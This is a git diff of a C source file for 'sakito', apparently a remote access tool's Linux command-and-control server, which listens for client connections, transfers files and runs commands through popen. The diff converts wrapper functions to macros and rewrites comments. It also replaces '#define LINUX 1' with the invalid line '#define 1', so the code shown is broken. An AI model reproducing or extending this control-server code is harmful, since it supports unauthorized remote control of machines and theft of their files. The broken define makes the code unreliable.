@@ -19,7 +19,7 @@ Use educationally/legally.
 
 #define CONSOLE_FSTR "sak1to-console:~%s$ "
 #define INTERACT_FSTR "┌%d─%s\n└%s>"
-#define LINUX 1
+#define 1
 #define SOCKET int
 #define INVALID_SOCKET -1
 #define SOCKET_ERROR -1
@@ -27,6 +27,28 @@ Use educationally/legally.
 #define INVALID_FILE -1
 #define READ 1
 #define WRITE 0
+
+/*
+Below contains sakito API macros that alias/wrap various unix/specific functions and syscalls.
+*/
+
+// Store current working directory in a provided buffer.
+#define get_cwd(buf) getcwd(buf, BUFLEN)
+
+// Write/send data to a given socket file descriptor.
+#define sakito_tcp_send(socket, buf, count) write(socket, buf, count)
+
+// Read/receive data from a given socket file descriptor.
+#define sakito_tcp_recv(socket, buf, count) read(socket, buf, count)
+
+// Write to stdout.
+#define write_stdout(buf, count) write(STDOUT_FILENO, buf, count)
+
+// Close a file descriptor.
+#define sakito_close_file(file) close(file)
+
+// Closing a socket to match Windows' closesocket() WINAPI's signature.
+#define closesocket(socket) close(socket)
 
 typedef int s_file;
 
@@ -68,19 +90,15 @@ typedef struct {
 
 } Server_map;
 
+/*
+Below contains linux specific sakito API functions.
+*/
+
 void bind_socket(const SOCKET listen_socket);
 void sakito_accept_conns(Server_map* const s_map);
 void resize_conns(Server_map* const s_map, int client_id);
 
-
-// Linux sakito-API wrapper for storing current working directory in a provided buffer.
-void get_cwd(char *buf) 
-{
-
-	getcwd(buf, BUFLEN);
-}
-
-// Linux sakito-API wrapper for terminating server.
+// wrapper for terminating server.
 void terminate_server(int listen_socket, const char* const error) 
 {
 	close(listen_socket);
@@ -94,10 +112,9 @@ void terminate_server(int listen_socket, const char* const error)
 	exit(err_code);
 }
 
-// Linux sakito-API wrapper for to creating a socket object.
+// Create a socket file descriptor.
 int create_socket() 
 {
-	// Create the server socket object.
 	int listen_socket = socket(AF_INET, SOCK_STREAM, 0);
 	if (listen_socket == -1) 
 	{
@@ -111,7 +128,7 @@ int create_socket()
 	return listen_socket;
 }
 
-// Linux mutex lock function.
+// Mutex unlock functionality.
 void mutex_lock(Server_map* const s_map) 
 {
 	// Wait until THRD_FLAG evaluates to false.
@@ -124,7 +141,7 @@ void mutex_lock(Server_map* const s_map)
 	s_map->THRD_FLAG = 1;
 }
 
-// Linux mutex unlock function.
+// Mutex unlocking functionality.
 void mutex_unlock(Server_map* const s_map) 
 {
 	pthread_mutex_unlock(&lock);
@@ -133,25 +150,7 @@ void mutex_unlock(Server_map* const s_map)
 	s_map->THRD_FLAG = 0;
 }
 
-// Linux sakito-API/ wrapper for write() syscall.
-int sakito_tcp_send(const SOCKET socket, const char* buf, const size_t count) 
-{
-	return write(socket, buf, count);
-}
-
-// Linux sakito-API/ wrapper for read() syscall.
-int sakito_tcp_recv(const SOCKET socket, char* const buf, const size_t count) 
-{
-	return read(socket, buf, count);
-}
-
-// Linux sakito-API/ wrapper for write()'ing to stdout.
-int write_stdout(const char* buf, size_t count) 
-{
-	return write(STDOUT_FILENO, buf, count);
-}
-
-// Linux open() wrapper/sakito-API to return s_file which is a typedef alias for int/file descriptors.
+// Call open() to return s_file which is a typedef alias for int/file descriptors.
 s_file sakito_open_file(const char* filename, int rw_flag) 
 {
 	// Supports only read/write modes.
@@ -163,13 +162,7 @@ s_file sakito_open_file(const char* filename, int rw_flag)
 	return INVALID_FILE;
 }
 
-// Linux sakito-API/wrapper for close().
-int sakito_close_file(s_file file) 
-{
-	return close(file);
-}
-
-// Linux sakito-API to wrap read/write syscalls and file share logic (receive) for linux.
+// TCP file transfer logic (receive).
 int sakito_recv_file(const SOCKET socket, s_file file, char* const buf, uint64_t f_size) 
 {
 	// Varaible to keep track of downloaded data.
@@ -177,16 +170,15 @@ int sakito_recv_file(const SOCKET socket, s_file file, char* const buf, uint64_t
 	uint64_t total = 0;
 
 	do
-	{
 		i_result = read(socket, buf, BUFLEN);
-	}
 	while ((i_result > 0)
 			&& (write(file, buf, i_result))
 			&& ((total += (uint64_t)i_result) != f_size));
 
 	return i_result;
 }
-// Linux sakito-API to calculate file size of a given s_file/file descriptor.
+
+// Calculate file size of a given s_file/file descriptor.
 uint64_t sakito_file_size(s_file file) 
 {
 	uint64_t f_size = (uint64_t)lseek64(file, 0, SEEK_END);
@@ -196,7 +188,7 @@ uint64_t sakito_file_size(s_file file)
 	return f_size;
 }
 
-// Linux sakito-API to wrap read/write syscalls and file share logic (send) for linux.
+// TCP file transfer logic (send).
 int sakito_send_file(int socket, int file, char* const buf, uint64_t f_size) 
 {
 	// Calculate file size and serialize the file size integer.
@@ -221,15 +213,7 @@ int sakito_send_file(int socket, int file, char* const buf, uint64_t f_size)
 	return i_result;
 }
 
-
-
-// Wrapper function for close() to match Windows' closesocket() API's signature.
-void closesocket(SOCKET socket) 
-{
-	close(socket);
-}
-
-// Linux sakito-API for executing a command via the host system.
+// Execute a command via the host system.
 void exec_cmd(Server_map* const s_map) 
 {
 	// Call Popen to execute command(s) and read the processes' output.
@@ -247,7 +231,7 @@ void exec_cmd(Server_map* const s_map)
 	pclose(fpipe);
 }
 
-// Linux sakito-API for terminating the console application and server. 
+// Terminating the console application and server. 
 void terminate_console(Server_map* const s_map) 
 {
 	// Quit accepting connections.
@@ -283,7 +267,7 @@ void* accept_conns(void* param)
 	return NULL;
 }
 
-// Linux sakito-API for initialization of the console application and server.
+// Initialization API of the console application and server.
 void sakito_init(Server_map* const s_map) 
 {
 	// Set out race condition flag to false.
